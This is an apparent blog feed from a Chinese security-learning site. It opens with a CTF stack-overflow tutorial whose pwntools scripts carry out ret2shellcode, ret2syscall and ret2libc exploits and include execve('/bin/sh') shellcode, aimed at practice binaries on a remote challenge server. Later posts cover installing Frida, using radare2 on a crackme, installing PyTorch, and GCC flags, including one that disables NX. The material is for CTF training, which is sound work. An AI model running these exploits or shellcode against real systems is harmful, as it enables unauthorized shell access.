&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407132843.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407133456.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;payload:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#coding:utf-8
from pwn import *
# context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )
# sh = process(./ret2shellcode)
sh = remote(&amp;quot;47.106.212.155&amp;quot;,10002)
## 获得system(&amp;quot;bin/sh&amp;quot;)的asm
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080
# sh.sendline(shellcode+&amp;quot;\x90&amp;quot;*(112-len(shellcode))+p32(buf2_addr))
sh.sendline(shellcode.ljust(112,&amp;quot;A&amp;quot;)+p32(buf2_addr))
sh.interactive()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407134402.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;练习题：sniperoj-pwn100-shellcode-x86-64&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407140954.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407144021.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;偏移：&lt;code&gt;var void *buf @ rbp-0x10&lt;/code&gt;   shellcode可用空间：16+8=24&lt;/p&gt;

&lt;p&gt;找shellcode  &lt;a href=&#34;https://www.exploit-db.com/&#34;&gt;https://www.exploit-db.com/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://shell-storm.org/shellcode/&#34;&gt;http://shell-storm.org/shellcode/&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;    .global _start
_start:
    # char *const argv[]
    xorl %esi, %esi

    # &#39;h&#39; &#39;s&#39; &#39;/&#39; &#39;/&#39; &#39;n&#39; &#39;i&#39; &#39;b&#39; &#39;/&#39;
    movq $0x68732f2f6e69622f, %rbx

    # for &#39;\x00&#39;
    pushq %rsi

    pushq %rbx

    pushq %rsp
    # const char *filename
    popq %rdi

    # __NR_execve 59
    pushq $59
    popq %rax

    # char *const envp[]
    xorl %edx, %edx

    syscall
 */

/*
  gcc -z execstack push64.c

  uname -r
  3.19.3-3-ARCH
 */
 shellcode = &amp;quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56&amp;quot;
    &amp;quot;\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#coding:utf-8
from pwn import *
# context(log_level = &#39;debug&#39;,arch =&#39;x64&#39;,os = &#39;linux&#39; )
io = process(&#39;./shellcode&#39;)
# io = remote(&amp;quot;47.106.212.155&amp;quot;,10003)
shellcode =     &amp;quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&amp;quot;
io.recvuntil(&#39;[&#39;)
buf_addr = io.recvuntil(&#39;]&#39;,drop=True)
buf_addr = int(buf_addr,16)
# print(buf_addr)
payload = &amp;quot;A&amp;quot;*24 + p64(buf_addr+32) + shellcode
# 32是24字节的填充数据长度加返回地址长度24+8
print payload
io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&#34;ret2syscall&#34;&gt;ret2syscall&lt;/h6&gt;

&lt;p&gt;控制程序执行系统调用&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop&#34;&gt;ret2syscall&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407152204.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407152706.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;相对ebp的偏移为0x64=108  覆盖范围为+4=112&lt;/p&gt;

&lt;p&gt;没法ret2text,也没法ret2shellcode&lt;/p&gt;

&lt;p&gt;只有使用系统调用来getshell。执行 int 0x80即可执行对应的系统调用&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;,NULL,NULL)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用ROPgadget寻找gadgets&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407155958.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;这样就能够控制到eax,ebx,ecx,edx寄存器。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407160123.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407160710.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;写payload:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#coding:utf-8
from pwn import *
# context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )
# io = process(./ret2syscall)
io = remote(&amp;quot;47.106.212.155&amp;quot;,10004)

pop_eax_addr = 0x080bb196
pop_ebcdx_addr = 0x0806eb90
int_0x80_addr = 0x08049421
bin_sh_addr = 0x080BE408
payload = flat(
    [&amp;quot;A&amp;quot;*112,pop_eax_addr,0xb,pop_ebcdx_addr,0,0,bin_sh_addr,int_0x80_addr]
)
io.sendline(payload)
io.interactive()

&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&#34;ret2libc&#34;&gt;ret2libc&lt;/h6&gt;

&lt;p&gt;ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(&amp;ldquo;/bin/sh&amp;rdquo;)，故而此时我们需要知道 system 函数的地址。&lt;/p&gt;

&lt;p&gt;eg1:  &lt;a href=&#34;https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1&#34;&gt;ret2libc1&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407175007.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1Ch] [ebp-64h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts(&amp;quot;RET2LIBC &amp;gt;_&amp;lt;&amp;quot;);
  gets(&amp;amp;s);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407175502.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407175715.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;exp1:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

# io = process(&#39;./ret2libc1&#39;)
io = remote(&amp;quot;47.106.212.155&amp;quot;,10006)
binsh_addr = 0x08048720
sym_plt_addr = 0x08048460

payload = flat([112*&#39;A&#39;,sym_plt_addr,&#39;b&#39;*4,binsh_addr])
# &#39;bbbb&#39; 作为函数调用栈返回地址的虚假的地址

io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;p&gt;eg2:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2&#34;&gt;ret2libc2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;缺少/bin/sh 只能自己寻找gadgets来进行构造。&lt;/p&gt;

&lt;p&gt;exp:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

# io = process(&#39;./ret2libc2&#39;)
io = remote(&amp;quot;47.106.212.155&amp;quot;,10007)
# binsh_addr = 0x08048720
sym_plt_addr = 0x08048490
sym_imp_gets_addr = 0x08048460
pop_ebx_addr = 0x0804872f
buf2_addr = 0x804a080

payload = flat([&amp;quot;A&amp;quot;*112,sym_imp_gets_addr,pop_ebx_addr,buf2_addr,sym_plt_addr,&#39;x&#39;*4,buf2_addr])
io.sendline(payload)
io.sendline(&amp;quot;/bin/sh&amp;quot;)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;eg3:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3&#34;&gt;ret2libc3&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;2的基础上去掉了system的地址。&lt;/p&gt;

&lt;p&gt;got 表泄露libc的函数地址&lt;/p&gt;

&lt;p&gt;利用思路：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;泄露 __libc_start_main 地址&lt;/li&gt;
&lt;li&gt;获取 libc 版本&lt;/li&gt;
&lt;li&gt;获取 system 地址与 /bin/sh 的地址&lt;/li&gt;
&lt;li&gt;再次执行源程序&lt;/li&gt;
&lt;li&gt;触发栈溢出执行 system(‘/bin/sh’)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;exp:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from LibcSearcher import LibcSearcher

context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )
# io = process(&#39;./ret2libc3&#39;)
io = remote(&amp;quot;47.106.212.155&amp;quot;,10008)
elf = ELF(&#39;./ret2libc3&#39;)
puts_plt = elf.plt[&#39;puts&#39;]
start_main_got = elf.got[&#39;__libc_start_main&#39;]
main = elf.symbols[&#39;main&#39;]

payload = flat([&amp;quot;A&amp;quot;*112,puts_plt,main,start_main_got])
io.sendlineafter(&amp;quot;Can you find it !?&amp;quot;,payload)

libc_start_main_addr = u32(io.recv()[0:4])
libc = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_addr)
libcbase = libc_start_main_addr-libc.dump(&amp;quot;__libc_start_main&amp;quot;)
sym_addr = libcbase+libc.dump(&#39;system&#39;)
binsh_addr = libcbase+libc.dump(&#39;str_bin_sh&#39;)

payload = flat([&amp;quot;A&amp;quot;*112,sym_addr,&amp;quot;bbbb&amp;quot;,binsh_addr])
io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;中级rop&#34;&gt;中级ROP&lt;/h5&gt;

&lt;h6 id=&#34;ret2csu&#34;&gt;ret2csu&lt;/h6&gt;

&lt;p&gt;利用 x64 下的 __libc_csu_init 中的 gadgets.&lt;/p&gt;

&lt;h6 id=&#34;ret2reg&#34;&gt;ret2reg&lt;/h6&gt;

&lt;h6 id=&#34;brop&#34;&gt;BROP&lt;/h6&gt;

&lt;h5 id=&#34;高级rop&#34;&gt;高级ROP&lt;/h5&gt;

&lt;h6 id=&#34;ret2-dl-runtime-resolve&#34;&gt;ret2_dl_runtime_resolve&lt;/h6&gt;

&lt;h6 id=&#34;srop&#34;&gt;SROP&lt;/h6&gt;

&lt;h6 id=&#34;ret2vdso&#34;&gt;ret2VDSO&lt;/h6&gt;

&lt;h5 id=&#34;花式栈溢出&#34;&gt;花式栈溢出&lt;/h5&gt;

&lt;h5 id=&#34;canary-绕过技术&#34;&gt;Canary 绕过技术&lt;/h5&gt;
</description>
      
    </item>
    
    <item>
      <title>Frida从入门到放弃_2</title>
      <link>https://naivete.cc/post/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_2/</link>
      <pubDate>Sat, 02 Feb 2019 20:39:26 +0800</pubDate>
      
      <guid>https://naivete.cc/post/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_2/</guid>
      
        <description>&lt;ul&gt;
&lt;li&gt;补充ing&lt;/li&gt;
&lt;/ul&gt;
</description>
      
    </item>
    
    <item>
      <title>Frida从入门到放弃_1</title>
      <link>https://naivete.cc/post/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_1/</link>
      <pubDate>Tue, 22 Jan 2019 20:39:26 +0800</pubDate>
      
      <guid>https://naivete.cc/post/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_1/</guid>
      
        <description>

&lt;h3 id=&#34;0x00-frida&#34;&gt;0x00 Frida&lt;/h3&gt;

&lt;p&gt;Frida 官网：&lt;a href=&#34;https://www.frida.re/&#34;&gt;https://www.frida.re/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;github: &lt;a href=&#34;https://github.com/frida/frida&#34;&gt;https://github.com/frida/frida&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Dynamic instrumentation toolkit for developers, reverse-engineers, and security
researchers.&lt;/p&gt;

&lt;h3 id=&#34;0x01-安装&#34;&gt;0x01 安装&lt;/h3&gt;

&lt;p&gt;用python&lt;/p&gt;

&lt;p&gt;&lt;code&gt;pip install frida-tools&lt;/code&gt; 就一个命令搞定&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Failed to load the Frida native extension: DLL load failed: 找不到指定的模块&lt;/p&gt;

&lt;p&gt;报了这个错 查了大半天 原来我用的版本是基于python3.7编译的。我现在用的3.6.。。。。&lt;/p&gt;

&lt;p&gt;作者真的是脑子一根筋。。。 所以只好升级成3.7.。。。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-android环境&#34;&gt;0x02 Android环境&lt;/h3&gt;

&lt;p&gt;设备：小米mix2 运行Android8.0 MIUI10开发版已解锁root&lt;/p&gt;

&lt;p&gt;frida-server: 用的arm64版本&lt;/p&gt;

&lt;p&gt;下载号frida-server  然后adb push 进去&lt;/p&gt;

&lt;p&gt;&lt;code&gt;adb push frida-server /data/local/tmp&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;然后&lt;code&gt;chomd 755 frida-server&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;运行&lt;code&gt;./frida-server&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190112133452.png&#34; alt=&#34;frida-server&#34; /&gt;&lt;/p&gt;

&lt;p&gt;命令行运行&lt;code&gt;frida-ps -U&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190112133604.png&#34; alt=&#34;frida-ps&#34; /&gt;&lt;/p&gt;

&lt;p&gt;安装成功&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>radare2&#43;cutter使用指南</title>
      <link>https://naivete.cc/post/radare2&#43;cutter%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</link>
      <pubDate>Wed, 02 Jan 2019 20:39:26 +0800</pubDate>
      
      <guid>https://naivete.cc/post/radare2&#43;cutter%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</guid>
      
        <description>

&lt;h3 id=&#34;0x00-介绍&#34;&gt;0x00 介绍&lt;/h3&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/radare/radare2&#34;&gt;radare2&lt;/a&gt; 一个很实用的二进制分析和调试工具&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/radareorg/cutter&#34;&gt;cutter&lt;/a&gt; 是r2的GUI版。&lt;/p&gt;

&lt;h3 id=&#34;0x01-安装&#34;&gt;0x01 安装&lt;/h3&gt;

&lt;p&gt;支持的平台有如下：&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Windows (since XP), GNU/Linux, OS X, [Net|Free|Open]BSD,
Android, iOS, OSX, QNX, Solaris, Haiku, FirefoxOS.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Linux平台下直接&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/radare/radare2
cd radare2
sys/install.sh //(or sys/user.sh)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Windows下可以下载二进制安装包安装。官网&lt;a href=&#34;https://www.radare.org/r/&#34;&gt;下载&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Windows用户推荐使用Windows下的linux（wsl）来使用， win下更新慢。还是linux下用得舒服（方便，快捷）。&lt;/p&gt;

&lt;h3 id=&#34;0x03-工具介绍&#34;&gt;0x03 工具介绍&lt;/h3&gt;

&lt;p&gt;r2常用的包含有一下组件：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;rax2 用于数值转换&lt;/li&gt;
&lt;li&gt;rasm2  反汇编和汇编&lt;/li&gt;
&lt;li&gt;rabin2   查看文件格式&lt;/li&gt;
&lt;li&gt;radiff2 对文件进行 diff&lt;/li&gt;
&lt;li&gt;ragg2/ragg2­cc  开发shellcode工具&lt;/li&gt;
&lt;li&gt;rahash2  各种密码算法， hash算法&lt;/li&gt;
&lt;li&gt;radare2 整合了所有工具&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;使用帮助直接&lt;code&gt;-h&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;rax2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123153746.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;rasm2&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123153901.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;E:笔记Typora学习日记assets1542959275318.png&#34; alt=&#34;1542959275318&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;rabin2&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123154355.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;eg: (&lt;code&gt;-I&lt;/code&gt;)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123154422.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;radiff2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123154448.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;ragg2/ragg2­cc&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123154514.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;rahash2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123154604.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;radare2 (最常用) 可缩写为r2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123155156.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;0x04-r2-实战学习&#34;&gt;0x04 r2 实战学习&lt;/h3&gt;

&lt;p&gt;challenge来源于：&lt;a href=&#34;http://reversing.kr&#34;&gt;http://reversing.kr&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;先查看一下文件信息：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123155334.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;GUI?:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123155444.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;用r2载入，自动分析&lt;code&gt;aaa&lt;/code&gt;命令：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123155649.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;vv&lt;/code&gt; 命令查看界面：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123160028.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;注意0x00401080 调用了GetDlgItemTextA&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123160457.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;s 调到main函数，查看main的汇编代码：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123160744.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123160818.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;pdc&lt;/code&gt;查看伪代码：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123161145.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;大写的&lt;code&gt;VV&lt;/code&gt;命令查看图形界面 使用hijk来进行界面移动。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123161242.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;看到调用地址0x401020，s跳过去 ；发现没解析 可使用af来解析。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123162026.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;看到GetDlgTemTextA调用：&lt;/p&gt;

&lt;p&gt;函数调用&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123162157.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123162302.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;差不多逻辑就是一直比对字符串，从第二位开始比最后第一位&lt;/p&gt;

&lt;p&gt;得到&lt;code&gt;Ea5yR3versing&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;命令记不住或者想知道有些什么命令可以用就可以加个？号查询&lt;/p&gt;

&lt;h3 id=&#34;0x05-cutter的使用&#34;&gt;0x05 Cutter的使用&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;多图待补&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&#34;https://legacy.gitbook.com/book/radare/radare2book/details&#34;&gt;Radare2 Book&lt;/a&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>Pytorch学习_1安装</title>
      <link>https://naivete.cc/post/pytorch%E5%AD%A6%E4%B9%A0_1%E5%AE%89%E8%A3%85/</link>
      <pubDate>Sat, 08 Dec 2018 23:40:51 +0800</pubDate>
      
      <guid>https://naivete.cc/post/pytorch%E5%AD%A6%E4%B9%A0_1%E5%AE%89%E8%A3%85/</guid>
      
        <description>

&lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;

&lt;p&gt;本来想着用&lt;strong&gt;tensorflow&lt;/strong&gt;的 然而GPU版总是报各种各样的BUG&lt;/p&gt;

&lt;p&gt;所以打算入坑一下学pytorch&lt;/p&gt;

&lt;p&gt;配置：win10+i76700HQ+GTX1060+16G&lt;/p&gt;

&lt;p&gt;软件版本：CUDA10+python3.6+pytorch 1 源码编译&lt;/p&gt;

&lt;p&gt;尝试1：官方安装方法不支持 CUDA 10 太坑，社区有编译通过的，所以只有自己编译试试&lt;/p&gt;

&lt;p&gt;报各种异常，但是没停，那就等等&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181204002444.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181204153247.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;CPU被占满，巨卡。&lt;/p&gt;

&lt;p&gt;一觉起来之后：安装失败&lt;/p&gt;

&lt;p&gt;尝试2：等着完全支持CUDA10之后在用GPU跑吧。&lt;/p&gt;

&lt;p&gt;妥协：用阿里云的学生服务器装了CPU的版本：顺便把TensorFlow 也给装了。。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181204153129.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;然而 在一个星期之后 pytorch1.0出来了 支持了CUDA10    nice&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;pip3 install http://download.pytorch.org/whl/cu100/torch-1.0.0-cp36-cp36m-win_amd64.whl
pip3 install torchvision
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181208233904.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;期间没有遇到任何问题 真舒畅。。。&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>PWN 小tools的使用</title>
      <link>https://naivete.cc/post/pwn-%E5%B0%8Ftools%E7%9A%84%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Mon, 22 Oct 2018 20:39:26 +0800</pubDate>
      
      <guid>https://naivete.cc/post/pwn-%E5%B0%8Ftools%E7%9A%84%E4%BD%BF%E7%94%A8/</guid>
      
        <description>

&lt;h3 id=&#34;gcc-编译常用命令&#34;&gt;GCC 编译常用命令&lt;/h3&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;不带选项&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;gcc test.c        将test.c预处理、汇编、编译并链接形成可执行文件。这里未指定输出文件，默认输出为a.out。&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;-o&lt;/td&gt;
&lt;td&gt;指定生成的输出文件；&lt;/td&gt;
&lt;td&gt;gcc test.c -o test  将test.c预处理、汇编、编译并链接形成可执行文件test。-o选项用来指定输出文件的文件名。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;-E&lt;/td&gt;
&lt;td&gt;仅执行编译预处理；&lt;/td&gt;
&lt;td&gt;gcc -E test.c -o test.i   将test.c预处理输出test.i文件。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;-S&lt;/td&gt;
&lt;td&gt;将C代码转换为汇编代码；&lt;/td&gt;
&lt;td&gt;gcc -S test.i   将预处理输出文件test.i汇编成test.s文件。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;-c&lt;/td&gt;
&lt;td&gt;仅执行编译操作，不进行连接操作。&lt;/td&gt;
&lt;td&gt;gcc -c test.s   将汇编输出文件test.s编译输出test.o文件。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;-wall&lt;/td&gt;
&lt;td&gt;显示警告信息；&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;无选项链接&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;gcc test.o -o test 将编译输出文件test.o链接成最终可执行文件test。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;-O&lt;/td&gt;
&lt;td&gt;使用编译优化级别1编译程序。级别为1~3，级别越大优化效果越好，但编译时间越长&lt;/td&gt;
&lt;td&gt;gcc -O1 test.c -o test&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;&lt;/td&gt;
&lt;td&gt;关掉DEP/NX（堆栈不可执行）&lt;/td&gt;
&lt;td&gt;gcc  -z execstack -o level level.c&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;&lt;/td&gt;
